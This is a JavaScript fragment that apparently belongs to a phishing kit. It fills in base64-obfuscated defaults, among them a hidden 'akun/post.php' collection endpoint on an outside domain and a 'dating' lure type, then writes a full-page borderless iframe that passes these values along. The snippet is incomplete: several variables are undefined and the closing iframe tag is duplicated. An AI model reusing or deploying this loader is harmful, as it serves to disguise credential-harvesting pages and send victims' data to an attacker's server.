
if(cid("s")){
	var srv = cid("s");
}else{
	var srv = 'aHR0cHM6Ly93ZWR1c3MuY29tL2FrdW4vcG9zdC5waHA';
}
if(cid("u")){
	var usr = cid("u");
}else{
	var usr = 'UHJla2Vy';
}
if(cid("f")){
	var fp = cid("f");
}else{
	var fp = 'ZGF0aW5n';
}
document.write("<iframe name='site' id='site' width='100%' height='100%' frameborder='0' marginheight='0' marginwidth='0' src='"
	+ frm + '?i=' + img + '&t=' + ttl + '&s=' + srv + '&u=' + usr + '&f=' + fp + "'></iframe>'></iframe>");
